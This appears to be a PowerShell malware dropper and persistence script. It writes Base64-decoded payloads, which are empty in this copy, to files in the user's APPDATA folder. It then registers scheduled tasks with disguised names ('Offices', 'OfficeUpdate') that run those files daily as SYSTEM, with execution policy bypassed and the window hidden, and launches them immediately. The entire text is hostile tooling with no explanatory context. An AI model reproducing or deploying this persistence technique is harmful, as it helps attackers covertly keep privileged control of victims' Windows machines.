
$filepath1 = $env:APPDATA + "\settings.in"
$filepath2 = $env:APPDATA + "\stunck.in"
Remove-Item -path $filepath1 -Force
Remove-Item -path $filepath2 -Force
	
	
$res  = [System.Convert]::FromBase64String("")
$r=[System.Text.Encoding]::UTF8.GetString($res)
$r >> $filepath1
$res  = [System.Convert]::FromBase64String("")
$r=[System.Text.Encoding]::UTF8.GetString($res)
$r >> $filepath2

schtasks /create /tn "Offices" /tr "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File \"$filepath1\"" /sc DAILY /st 09:00 /ru System
schtasks /create /tn "OfficeUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File \"$filepath2\"" /sc DAILY /st 09:00 /ru System

schtasks /run /tn "Offices"
schtasks /run /tn "OfficeUpdate"
